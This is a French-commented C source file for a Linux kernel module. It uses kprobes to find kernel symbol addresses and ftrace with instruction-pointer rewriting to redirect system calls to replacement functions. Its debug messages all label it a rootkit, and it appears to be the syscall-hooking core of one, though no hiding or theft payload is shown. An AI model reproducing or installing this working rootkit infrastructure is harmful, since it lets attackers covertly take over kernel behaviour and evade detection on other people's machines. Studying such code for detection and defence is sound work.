#include <linux/ftrace.h>     // Fournit l'API ftrace pour intercepter les appels de fonctions
#include <linux/linkage.h>    // Définitions liées à la liaison et aux appels système
#include <linux/slab.h>       // Gestion de la mémoire dans le noyau (kmalloc, kfree)
#include <linux/uaccess.h>    // Gestion des accès entre espace utilisateur et noyau
#include <linux/version.h>    // Fournit des macros pour vérifier la version du noyau
#include <linux/kprobes.h>    // API pour manipuler les probes dynamiques dans le noyau

// Vérification de la version du noyau
// Si le noyau est 6.0 ou supérieur, on définit une macro pour indiquer cela
#if LINUX_VERSION_CODE >= KERNEL_VERSION(6,0,0)
#define PTREGS_SYSCALL_STUBS 1
#endif

// Définit la manière dont les noms des appels système sont construits selon la version du noyau
#ifdef PTREGS_SYSCALL_STUBS
#define SYSCALL_NAME(name) ("__x64_" name)  // Préfixe pour les appels système sur noyaux récents
#else
#define SYSCALL_NAME(name) (name)          // Pas de préfixe pour les anciens noyaux
#endif

// Macro pour simplifier la définition d'un hook
#define HOOK(_name, _hook, _orig)   \
{                                   \
    .name = SYSCALL_NAME(_name),    \
    .function = (_hook),            \
    .original = (_orig),            \
}

// Configuration de l'optimisation du compilateur (désactivation des appels optimisés en chaîne)
#define USE_FENTRY_OFFSET 0
#if !USE_FENTRY_OFFSET
#pragma GCC optimize("-fno-optimize-sibling-calls")
#endif

// Structure de base pour gérer un hook
struct ftrace_hook {
    const char *name;         // Nom du symbole (fonction) à intercepter
    void *function;           // Fonction de remplacement (hook)
    void *original;           // Adresse de la fonction originale
    unsigned long address;    // Adresse résolue du symbole
    struct ftrace_ops ops;    // Structure utilisée par ftrace pour gérer les hooks
};

/**
 * Fonction : find_symbol_address
 * Objectif : Trouver l'adresse d'un symbole noyau en utilisant kprobes.
 *
 * Étapes :
 * 1. Configurer une kprobe pour le symbole souhaité.
 * 2. Enregistrer la kprobe pour récupérer l'adresse.
 * 3. Désenregistrer immédiatement la kprobe après avoir obtenu l'adresse.
 */
static unsigned long find_symbol_address(const char *name)
{
    struct kprobe kp = {
        .symbol_name = name,  // Nom du symbole à localiser
    };
    unsigned long addr;

    // Enregistrer une kprobe pour obtenir l'adresse du symbole
    if (register_kprobe(&kp) < 0)
        return 0;

    // Récupérer l'adresse du symbole
    addr = (unsigned long)kp.addr;

    // Nettoyer la kprobe après utilisation
    unregister_kprobe(&kp);

    return addr;  // Retourne l'adresse du symbole
}

/**
 * Fonction : fh_resolve_hook_address
 * Objectif : Résoudre l'adresse d'un hook et la stocker.
 *
 * Étapes :
 * 1. Utiliser find_symbol_address pour obtenir l'adresse du symbole cible.
 * 2. Si USE_FENTRY_OFFSET est défini, ajuster l'adresse pour gérer les offsets.
 */
static int fh_resolve_hook_address(struct ftrace_hook *hook)
{
    // Localise l'adresse du symbole cible
    hook->address = find_symbol_address(hook->name);

    // Si l'adresse n'est pas résolue, retourner une erreur
    if (!hook->address) {
        pr_debug("rootkit: unresolved symbol: %s\n", hook->name);
        return -ENOENT;
    }

#if USE_FENTRY_OFFSET
    // Ajustement pour les noyaux utilisant l'offset d'entrée
    *((unsigned long *)hook->original) = hook->address + MCOUNT_INSN_SIZE;
#else
    *((unsigned long *)hook->original) = hook->address;
#endif

    return 0;
}

/**
 * Fonction : fh_ftrace_thunk
 * Objectif : Remplacer la fonction cible par la fonction hookée.
 *
 * Détails :
 * - Cette fonction redirige l'exécution vers la fonction spécifiée.
 * - Elle modifie le registre IP pour pointer vers la fonction hookée.
 */
static void notrace fh_ftrace_thunk(unsigned long ip, unsigned long parent_ip,
                                    struct ftrace_ops *ops, struct pt_regs *regs)
{
    // Récupère le hook associé à cette opération
    struct ftrace_hook *hook = container_of(ops, struct ftrace_hook, ops);

#if USE_FENTRY_OFFSET
    // Ajuste le registre IP pour rediriger l'exécution
    regs->ip = (unsigned long)hook->function;
#else
    // Si l'appel ne provient pas de ce module, redirige l'exécution
    if (!within_module(parent_ip, THIS_MODULE))
        regs->ip = (unsigned long)hook->function;
#endif
}

/**
 * Fonction : fh_install_hook
 * Objectif : Installer un hook pour une fonction spécifique.
 *
 * Étapes :
 * 1. Résoudre l'adresse du symbole cible.
 * 2. Configurer les options ftrace pour rediriger l'exécution.
 * 3. Enregistrer le hook avec ftrace.
 */
int fh_install_hook(struct ftrace_hook *hook)
{
    int err;

    // Résout l'adresse de la fonction cible
    err = fh_resolve_hook_address(hook);
    if (err)
        return err;

    // Configure les options pour rediriger l'exécution
    hook->ops.func = (ftrace_func_t)fh_ftrace_thunk;
    hook->ops.flags = FTRACE_OPS_FL_SAVE_REGS | FTRACE_OPS_FL_IPMODIFY;

    // Configure le filtre d'adresses pour indiquer l'adresse hookée
    err = ftrace_set_filter_ip(&hook->ops, hook->address, 0, 0);
    if (err) {
        pr_debug("rootkit: ftrace_set_filter_ip() failed: %d\n", err);
        return err;
    }

    // Enregistre la fonction dans ftrace
    err = register_ftrace_function(&hook->ops);
    if (err) {
        pr_debug("rootkit: register_ftrace_function() failed: %d\n", err);
        return err;
    }

    return 0;
}

/**
 * Fonction : fh_remove_hook
 * Objectif : Désinstaller un hook.
 *
 * Étapes :
 * 1. Désenregistrer la fonction dans ftrace.
 * 2. Supprimer l'adresse de la liste des adresses hookées.
 */
void fh_remove_hook(struct ftrace_hook *hook)
{
    int err;

    // Annule l'enregistrement du hook
    err = unregister_ftrace_function(&hook->ops);
    if (err) {
        pr_debug("rootkit: unregister_ftrace_function() failed: %d\n", err);
    }

    // Supprime le filtre d'adresses
    err = ftrace_set_filter_ip(&hook->ops, hook->address, 1, 0);
    if (err) {
        pr_debug("rootkit: ftrace_set_filter_ip() failed: %d\n", err);
    }
}

/**
 * Fonction : fh_install_hooks
 * Objectif : Installer plusieurs hooks à la fois.
 */
int fh_install_hooks(struct ftrace_hook *hooks, size_t count)
{
    int err;
    size_t i;

    // Boucle pour installer chaque hook
    for (i = 0; i < count; i++) {
        err = fh_install_hook(&hooks[i]);
        if (err)
            goto error;
    }

    return 0;

error:
    // En cas d'erreur, désinstalle les hooks déjà installés
    while (i != 0) {
        fh_remove_hook(&hooks[--i]);
    }
    return err;
}

/**
 * Fonction : fh_remove_hooks
 * Objectif : Retirer plusieurs hooks.
 */
void fh_remove_hooks(struct ftrace_hook *hooks, size_t count)
{
    size_t i;

    // Boucle pour retirer chaque hook
    for (i = 0; i < count; i++)
        fh_remove_hook(&hooks[i]);
}
